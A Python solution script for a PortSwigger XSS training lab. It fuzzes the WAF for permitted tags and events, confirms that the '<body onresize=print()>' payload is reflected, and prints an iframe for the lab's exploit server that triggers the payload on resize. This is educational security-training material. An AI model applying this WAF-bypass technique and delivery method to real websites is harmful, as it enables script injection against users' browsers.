# Lab 17 — Reflected XSS into HTML context with most tags and attributes blocked
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
#
# Vulnerability: Search — WAF blocks most HTML tags and event attributes
# Aim:           Call print() via a WAF-bypassing payload delivered via exploit server
#
# Technique:
#   Most tags return 400. Fuzz with Burp Intruder to find what's allowed.
#   Wordlist: PortSwigger XSS cheat sheet tag list and event list.
#
#   Step 1 — Find allowed tags:
#     Intruder payload: <§tag§>
#     Result: <body> is allowed (returns 200)
#
#   Step 2 — Find allowed events on <body>:
#     Intruder payload: <body §event§=1>
#     Result: onresize is allowed (returns 200)
#
#   Step 3 — Deliver via exploit server iframe that triggers a resize:
#     <iframe src="TARGET/?search=<body onresize=print()>"
#             onload=this.style.width='100px'>
#
#   The iframe's onload changes its own width → triggers resize inside the iframe
#   → onresize fires on the injected <body> → print() executes.
#
# Fuzzing must be done manually in Burp Intruder first.
# This script verifies the final payload reflects and prints the iframe exploit.
#
# Usage: python xss_lab17.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<body onresize=print()>"

if __name__ == "__main__":
    banner()
    section("LAB 17 — REFLECTED XSS: WAF BYPASS (TAG/EVENT FUZZING)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab17.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print("  ℹ  Fuzzing step requires Burp Intruder — do this manually first.")
    print("     Tag wordlist + event wordlist from portswigger.net/web-security/cross-site-scripting/cheat-sheet\n")

    print(f"  ➜  Verifying final payload reflects: {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})
    check_reflection(r.text, PAYLOAD, "WAF-bypass payload")

    iframe = (
        f'<iframe src="{url}/?search=%3Cbody+onresize%3Dprint()%3E"\n'
        f'        onload="this.style.width=\'100px\'">\n'
        f'</iframe>'
    )

    print_box("EXPLOIT SERVER BODY — paste this into the Body field", iframe)

    print("  ➜  Steps:")
    print("     1. Go to the exploit server")
    print("     2. Paste the iframe above into the Body field")
    print("     3. Click 'Store', then 'Deliver exploit to victim'")
    print()
    print("  ℹ  The iframe onload changes its width → triggers resize inside the frame")
    print("     → onresize fires on the injected <body> → print() runs.")
